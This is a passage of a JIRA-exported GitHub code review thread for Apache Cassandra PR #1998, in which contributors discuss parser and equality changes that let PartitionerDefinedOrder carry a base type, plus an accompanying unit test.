+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+            ++idx;
+            try
+            {
+                type = tmp.withBaseType(parse());
+            }
+            catch (Throwable throwable)
+            {
+                Iterator<String> argIterator = this.getKeyValueParameters().keySet().iterator();

Review Comment:
   just want to using the old format type parse of PartitionerDefinedOrder to do a double check parse.
   if the string of type is %s(%s)



;15/Nov/22 03:51;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022290778


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);
+            }
+            System.out.println(type.toString());
+            assertSame(type, TypeParser.parse(type.toString()));
+        }
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }

Review Comment:
   will add some test 



;15/Nov/22 03:52;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022293246


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)

Review Comment:
   +1



;15/Nov/22 03:59;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022293952


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')

Review Comment:
   yes ,throw an error may be more efficient



;15/Nov/22 04:01;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022290778


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);
+            }
+            System.out.println(type.toString());
+            assertSame(type, TypeParser.parse(type.toString()));
+        }
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }

Review Comment:
   will add some  other test . but the test case testParsePartitionerOrder() is the case with default partitioner and partritioner without base type 
   testParsePartitionerOrderWithBaseType() is the test case that partitoner wit base type



;15/Nov/22 06:03;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022358668


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);

Review Comment:
   yes, it is a bug I have write ,fix it now.



;15/Nov/22 06:16;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022365955


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -28,29 +29,38 @@
 import org.apache.cassandra.dht.IPartitioner;
 import org.apache.cassandra.utils.ByteBufferUtil;
 import org.apache.cassandra.utils.FBUtilities;
+import org.apache.cassandra.utils.Pair;
 
 /** for sorting columns representing row keys in the row ordering as determined by a partitioner.
  * Not intended for user-defined CFs, and will in fact error out if used with such. */
 public class PartitionerDefinedOrder extends AbstractType<ByteBuffer>
 {
     private final IPartitioner partitioner;
-
+    private final AbstractType<?> baseType;
+    
     public PartitionerDefinedOrder(IPartitioner partitioner)
     {
         super(ComparisonType.CUSTOM);
         this.partitioner = partitioner;
+        this.baseType = null;
+    }
+
+    public PartitionerDefinedOrder(IPartitioner partitioner, AbstractType<?> baseType)
+    {
+        super(ComparisonType.CUSTOM);
+        this.partitioner = partitioner;
+        this.baseType = baseType;
     }
 
     public static AbstractType<?> getInstance(TypeParser parser)
     {
-        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
-        Iterator<String> argIterator = parser.getKeyValueParameters().keySet().iterator();
-        if (argIterator.hasNext())
-        {
-            partitioner = FBUtilities.newPartitioner(argIterator.next());
-            assert !argIterator.hasNext();
-        }
-        return partitioner.partitionOrdering();
+        TypeParser clone = parser.clone();
+        return clone.getPartitionerDefinedOrder();

Review Comment:
   +1



;15/Nov/22 06:29;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022366104


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);

Review Comment:
   yes



;15/Nov/22 06:29;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022290778


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);
+            }
+            System.out.println(type.toString());
+            assertSame(type, TypeParser.parse(type.toString()));
+        }
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }

Review Comment:
   @blambov besides ,I have a question here ,why we use assertSame here ? for this patch if it is a PartitionerDefinedOrder  with a base type there will return a new PartitionerDefinedOrder object here and the memory address must be different . 
   So I want to know if the place in the codebase that invoked PartitionerDefinedOrder class must keep the memory address be the same ?



;15/Nov/22 06:59;githubbot;600","Maxwell-Guo closed pull request #2005: sstabledump errors when dumping data from index for CASSANDRA-17698
URL: https://github.com/apache/cassandra/pull/2005


;15/Nov/22 07:15;githubbot;600","Maxwell-Guo closed pull request #2004: sstabledump errors when dumping data from index for CASSANDRA-17698
URL: https://github.com/apache/cassandra/pull/2004


;15/Nov/22 07:15;githubbot;600","Maxwell-Guo closed pull request #2003: sstabledump errors when dumping data from index for CASSANDRA-17698
URL: https://github.com/apache/cassandra/pull/2003


;15/Nov/22 07:15;githubbot;600","Maxwell-Guo closed pull request #2002: sstabledump errors when dumping data from index for CASSANDRA-17698
URL: https://github.com/apache/cassandra/pull/2002


;15/Nov/22 07:15;githubbot;600","blambov commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1022480784


##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +98,24 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                tmp.withBaseType(Int32Type.instance);
+            }
+            System.out.println(type.toString());
+            assertSame(type, TypeParser.parse(type.toString()));
+        }
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }

Review Comment:
   Many implementations of `AbstractType` keep a map of already created types to ensure that they don't create the same object more than once. See e.g. `SetType`. It makes some sense to do the same for `PartitionerDefinedOrder` as well, but it is not something I personally insist on ;15/Nov/22 08:30;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1058115895


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();

Review Comment:
   ok



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();

Review Comment:
   ok



;28/Dec/22 07:21;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1058125810


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)

Review Comment:
   @blambov 
    It may no need to do checking.
   There will be two  possibilities when arrive here,1.PartitionerDefinedOrder(<partitioner>), then the final results will returned at the catch section from line 194 to line 205 .the partitioner type is get from k
   2.PartitionerDefinedOrder(<partitioner>:<baseType>),when arriving here the base type can be parsed with function parse() at line 192 ,also the partitioner type is get with k.
   For ByteOrderedPartitioner AND OrderPreservingPartitioner ,their partitionOrdering() will return ByteType.Instance and UTF8Type.Instance so we should only do for Random and mum3



;28/Dec/22 07:42;githubbot;600","blambov commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1061382544


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -107,6 +117,30 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if(baseType != null)
+        {
+            return String.format(""%s(%s:%s)"", getClass().getName(), partitioner.getClass().getName(), baseType.toString());
+        }
         return String.format(""%s(%s)"", getClass().getName(), partitioner.getClass().getName());
     }
+    
+    public AbstractType<?>  getBaseType()
+    {
+        return baseType; 
+    }
+
+    @Override
+    public boolean equals(Object obj)
+    {
+        if (this == obj)
+        {
+            return true;
+        }
+        if (obj instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder other = (PartitionerDefinedOrder) obj;
+            return this.baseType.equals(other.baseType) && this.partitioner.equals(other.partitioner);

Review Comment:
   Does this not throw when `baseType` is null?



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);

Review Comment:
   In this case we have processed ""PartitionerDefinedOrder()"". Do we expect other parameters after the closing bracket?



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+            ++idx;
+            try
+            {
+                type = tmp.withBaseType(parse());
+            }
+            catch (Throwable throwable)
+            {
+                Iterator<String> argIterator = this.getKeyValueParameters().keySet().iterator();

Review Comment:
   ""PartitionerDefinedOrder(%s)"" can be handled more easily by just checking if `:` was seen. If not, just return `type`. If yes, then `((PartitionerDefinedOrder)type).withBaseType(parse())` must succeed.
   
   Are you trying to preserve existing bad behavior of the parser (e.g. accepting string such as ""PartitionerDefinedOrder(Murmur3Partitioner=something)"")?



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)

Review Comment:
   I see what you mean, and it makes sense if we want to preserve existing poor parsing behavior.
   
   However, I would treat an appearance of e.g. `PartitionerDefinedOrder(ByteOrderedPartitioner)` as an error, because in that case there exists an underlying type that can and will be used directly. If the type is specified as `PartitionerDefinedOrder`, the result of this construction must be an instance of that.
   
   The strings we are parsing here are generated internally; I don't believe the user has any control over them and thus can't construct invalid-but-acceptable definitions such as this.



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')

Review Comment:
   Why do we accept a comma?



;04/Jan/23 12:07;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1064360240


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);

Review Comment:
   for line 176 we processed case: PartitionerDefinedOrder(<partitioner>) and We do not expect other parameters after closing bracket. 
   



;09/Jan/23 08:01;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1064360568


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')

Review Comment:
   Yes, a comma is not need here, remove it now .



;09/Jan/23 08:02;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1064420384


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -107,6 +117,30 @@ public TypeSerializer<ByteBuffer> getSerializer()
     @Override
     public String toString()
     {
+        if(baseType != null)
+        {
+            return String.format(""%s(%s:%s)"", getClass().getName(), partitioner.getClass().getName(), baseType.toString());
+        }
         return String.format(""%s(%s)"", getClass().getName(), partitioner.getClass().getName());
     }
+    
+    public AbstractType<?>  getBaseType()
+    {
+        return baseType; 
+    }
+
+    @Override
+    public boolean equals(Object obj)
+    {
+        if (this == obj)
+        {
+            return true;
+        }
+        if (obj instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder other = (PartitionerDefinedOrder) obj;
+            return this.baseType.equals(other.baseType) && this.partitioner.equals(other.partitioner);

Review Comment:
   yes, null should be added



;09/Jan/23 09:20;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1064424584


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
